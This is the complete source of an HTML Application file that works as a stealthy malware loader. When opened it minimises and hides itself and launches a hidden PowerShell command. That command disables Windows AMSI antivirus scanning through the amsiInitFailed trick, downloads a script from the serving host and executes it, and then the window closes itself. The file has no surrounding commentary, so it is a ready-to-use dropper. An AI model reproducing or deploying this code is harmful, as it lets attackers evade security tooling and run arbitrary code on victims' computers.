<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<hta:application showintaskbar="no" windowstate="minimize" scroll="no" border="none"/>
</head>
<body>
<script>
var u = 'https://' + location.host + '/s.txt?t=' + Math.random();
var p = 'powershell -nop -w hidden -ep bypass -c "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like \'*iUtils\'};$f=$a.GetFields(\'NonPublic,Static\')|?{$_.Name -eq \'amsiInitFailed\'};$f.SetValue($null,$true);iex((New-Object Net.WebClient).DownloadString(\'' + u + '\'))"';
new ActiveXObject('WScript.Shell').Run(p, 0, false);
setTimeout(function(){ try{ window.close(); }catch(e){} }, 2500);
</script>
</body>
</html>
